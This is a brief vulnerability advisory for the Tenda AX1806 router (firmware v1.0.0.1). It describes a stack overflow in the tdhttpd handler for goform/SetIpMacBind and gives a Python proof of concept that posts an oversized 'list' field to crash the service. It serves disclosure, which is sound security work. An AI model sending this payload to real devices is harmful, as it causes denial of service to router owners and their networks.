## Overview

- The device's official website: https://www.tenda.com.cn/product/AX1806.html
- Firmware download website: https://www.tenda.com.cn/download/detail-3306.html

## Affected version

v1.0.0.1

## Vulnerability details

tdhttpd in directory /bin has a stack overflow vulnerability. The vulnerability occurrs in the fromSetIpMacBind function, which is accessible via the URL `goform/SetIpMacBind`.  

- <img src="./image/1.png" alt="1.png" style="zoom:50%;" />

The function takes the POST argument `list`, does not verify its length, and copies it directly to a local variable on the stack, causing a stack overflow.  

## PoC

Poc of Denial of Service(DoS)

```python
import requests

data = {
    b"list": b'A'*0x800,
    b"bindnum": b"1"
}
res = requests.post("http://127.0.0.1/goform/SetIpMacBind", data=data)
print(res.content)
```

